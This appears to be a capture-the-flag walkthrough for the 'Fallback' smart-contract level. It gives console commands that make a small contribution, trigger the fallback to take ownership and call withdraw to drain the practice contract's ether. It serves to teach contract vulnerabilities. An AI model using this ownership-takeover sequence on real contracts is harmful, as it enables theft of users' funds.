# Fallback Solution

In the console run the following command:
```
await contract.contribute.sendTransaction({
    from: player,
    to: "0x91d39e2F5C5c64B34Bf2572e60501e2225808309",
    value: '990000000000000'
})
```

This will call the contribute function while also allowing you to send some ether(in wei units). we send exactly 990000000000000 wei so that way we meet the require function requirements ```require(msg.value < 0.001 ether);```

Calling the function normally like this ``` contract.contribute``` would only send a transaction with 0 ether sent with it. besides gas of course but that is to pay the validators to run it.

Now that we have some contribution to the contract we can now just send ether directly to the contract using the metamask send feature or we can use the console still and run
```
await contract.sendTransaction({
    from: player,
    to: "0x91d39e2F5C5c64B34Bf2572e60501e2225808309",
    value: '1000000000000000'
})
```
Then we can check if we are the owner by running 
```
await contract.owner()
```

If it returns our metamask address then we are the owner now! WooHoo!

Then the last thing we need to do is rob the contract so run the line below to take all their ether! 
```
await contract.withdraw()
```
You can check the contract on etherscan to make sure it's fully drained if you want aswell, but now you can submit the instance to complete it!